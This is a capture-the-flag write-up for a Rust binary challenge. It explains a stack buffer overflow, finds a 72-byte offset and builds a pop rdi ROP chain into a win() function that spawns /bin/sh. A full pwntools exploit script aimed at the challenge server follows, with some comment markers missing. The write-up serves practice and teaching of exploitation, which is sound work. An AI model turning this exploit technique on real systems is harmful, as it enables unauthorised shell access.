This is just a template, you don't need to follow it. Feel free to change it as you see fit.
## Name
PWN
### Problem Description
Stumbled upon Rust recently, still learning the ropes...

nc 0.cloud.chals.io 31984
### Solution
Key parts:

vuln():

Allocates buf = [0u8; 64].

Calls read(0, buf, 0x200) → reads up to 512 bytes into a 64-byte buffer ⇒ classic stack overflow.

win(key: u64):

Checks key == 0xdeadbeefcafebabe.

If true, calls system("/bin/sh") ⇒ gives a shell.

PATCHPOINT in a special section .text.patch with bytes [0x5F, 0xC3] = pop rdi ; ret
Goal: gain RIP control and jump to win() with the right argument.

On x86-64 System V calling convention:

The first argument to a function goes in rdi.

To call win(KEY) from a stack overflow, we need a gadget: pop rdi ; ret to load our 64-bit key into rdi, then ret to win.

PATCHPOINT gives exactly that gadget.

Then return into win with rdi = 0xdeadbeefcafebabe, which runs system("/bin/sh").
Found the overflow offset (72 bytes = 64 buffer + 8 saved RBP).

Got function/gadget addresses from the local ELF (win, pop rdi; ret).

Built ROP chain: padding → pop rdi; ret → key → win.

Synced with prompt (recvuntil) and sent payload.

Dropped to interactive shell via system("/bin/sh") and read the flag.
from pwn import *

use the local binary to discover symbols/gadgets
elf = ELF("./chall", checksec=False)
rop = ROP(elf)

WIN      = elf.symbols["win"]
POP_RDI  = rop.find_gadget(["pop rdi","ret"]).address   # should find the PATCHPOINT (0x5f c3)
RET_ONLY = rop.find_gadget(["ret"]).address             # for occasional 16-byte alignment

log.info(f"win = {hex(WIN)}")
log.info(f"pop rdi; ret = {hex(POP_RDI)}")
log.info(f"ret = {hex(RET_ONLY)}")

offset = 64 + 8     # buf + saved RBP = 72
KEY    = 0xdeadbeefcafebabe

payload  = b"A"*offset
payload += p64(POP_RDI) + p64(KEY)
optional single ret for alignment — harmless if not needed
payload += p64(RET_ONLY)
payload += p64(WIN)

run remote
HOST, PORT = "0.cloud.chals.io", 31984
io = remote(HOST, PORT)

sync to the prompt to avoid partial sends
io.recvuntil(b"Say something")
io.sendline(payload)

drop to interactive shell
io.interactive()


i used this to get the flag; with who am i, ls which returned flag.txt then i got the cat flag.txt
